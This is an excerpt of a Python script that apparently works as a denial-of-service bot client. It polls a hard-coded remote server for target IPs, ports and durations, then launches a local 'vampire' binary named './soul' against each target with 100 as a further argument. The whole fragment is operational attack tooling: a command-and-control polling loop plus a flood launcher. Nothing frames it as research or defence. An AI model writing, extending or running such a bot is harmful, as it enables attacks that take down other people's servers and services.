...
BASE_URL = 'http://13.60.37.124:9000/Navin_pre/'  # Your VPS IP
VAMPIRE_PATH = '/Run1/'
DONE_PATH = '/Run1/done'
...
def process_new_task(added):
    ...
    if ip and port and time_val:
        ...
        if key not in active_tasks:
            ...
            try:
                # Vampire binary use karen
                process = subprocess.Popen(['./soul', ip, str(port), str(time_val), '100'])
                print(f"[+] Launched vampire binary: ./soul {ip} {port} {time_val} 100 (PID: {process.pid})")
            except Exception as e:
                print(f"[!] Failed to launch vampire binary: {e}")
...
def main_loop():
    while True:
        try:
            response = requests.get(f'{BASE_URL}{VAMPIRE_PATH}')
